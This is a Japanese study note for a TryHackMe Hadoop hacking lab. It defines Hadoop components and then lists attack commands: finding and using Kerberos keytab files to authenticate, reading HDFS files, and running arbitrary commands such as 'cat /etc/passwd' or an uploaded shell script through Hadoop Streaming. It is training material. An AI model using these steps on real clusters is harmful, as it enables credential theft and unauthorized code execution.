# Hadoop

https://tryhackme.com/room/hackinghadoop

## 用語

- クラスター- データレイクを構成するすべてのシステムを指します。
- ノード - Hadoop クラスター内の単一のホストまたはコンピューター。
- NameNode - Hadoopファイル システムのディレクトリ ツリーを保持する役割を担うノード。
- DataNode - NameNode の指示に従ってファイルを保存するスレーブ ノード。
- プライマリ ネームノード- ディレクトリ構造を維持する役割を担う現在のアクティブ ノード。
- セカンダリネームノード- プライマリネームノードが応答しなくなった場合に、ディレクトリ構造をシームレスに引き継ぐバックアップノード。クラスター内には複数のセカンダリネームノードが存在できますが、アクティブなプライマリネームノードは常に1つだけです。
- マスター ノード- HDFS マネージャーや YARN リソース マネージャーなどの Hadoop「管理」アプリケーションを実行しているノード。
- スレーブノード- HDFSやMapReduceなどのHadoop「ワーカー」アプリケーションを実行するノード。1つのノードが同時にマスターノードとスレーブノードの両方として機能する場合があることに注意してください。
- エッジノード- ZeppelinやHueなどのHadoopユーザーアプリケーションをホストするノード。これらは、ユーザーがデータレイクに保存されたデータを処理するのに使用できるアプリケーションです。
- Kerberised- Kerberosを通じてセキュリティが有効になっているデータレイクを指す用語。

### アプリケーションとサービス

- HDFS - Hadoop分散ファイルシステムは、ファイルなどの非構造化データの主要なストレージアプリケーションです。
- Hive - Hiveは構造化データの主要なストレージアプリケーションです。巨大なデータベースと考えてください。
- YARN - Hadoop のメイン リソース マネージャー アプリケーション。クラスター内のジョブのスケジュールに使用されます。
- MapReduce - 膨大な量のデータを処理するためのHadoopアプリケーション・エグゼキューター。フィルタリングとソートを実行するMapプロシージャと、サマリー操作を実行するreduceメソッドで構成されています。
- HUE - HDFS および Hive 用のGUIを提供するユーザー アプリケーション。
- Zookeeper - 問題のクラスターの構成を設定するために、クラスターの運用サービスを提供します。
- Spark - 大規模データ処理用のエンジン。
- Kafka -リアルタイムデータ処理用のパイプラインを構築するためのメッセージブローカー。
- Ranger - データレイク内のリソースに対する権限アクセス制御の構成に使用されます。
- Zeppelin - インタラクティブなデータ分析のための Web ベースのノートブック アプリケーション。

## Kerberos Keytab

https://github.com/wavestone-cdt/hadoop-attack-library

検索

```sh
find / -name *keytab* 2>/dev/null
```

プリンシパル名などを表示

```sh
klist -k /etc/security/keytabs/zp.service.keytab
```

認証

```sh
kinit <principal name> -k -V -t <keytabfile>

# 例
kinit zp/hadoop.docker.com@EXAMPLE.COM -k -V -t /etc/security/keytabs/zp.service.keytab
```

HDFS

```sh
/usr/local/hadoop-2.7.7/bin/hdfs dfs -ls /

/usr/local/hadoop-2.7.7/bin/hdfs dfs -cat /user/zp/flag3.txt
```

権限を持つユーザー、サービスを特定

```sh
# hadoop_super
cat /etc/group
```

コマンド実行

```sh
# -input: 空ではないファイル
# -output: 存在しないディレクトリ
/usr/local/hadoop-2.7.7/bin/hadoop jar /usr/local/hadoop-2.7.7/share/hadoop/tools/lib/hadoop-streaming-2.7.7.jar -input /tmp/aaa -output /tmp/tmpdir -mapper "cat /etc/passwd" -reducer NONE

# -file で、ローカル環境のシェルファイルを実行できる
/usr/local/hadoop-2.7.7/bin/hadoop jar /usr/local/hadoop-2.7.7/share/hadoop/tools/lib/hadoop-streaming-2.7.7.jar -input /tmp/aaa -output /tmp/tmpdir -mapper "/tmp/aaa.sh" -reducer NONE -file /tmp/aaa.sh
```
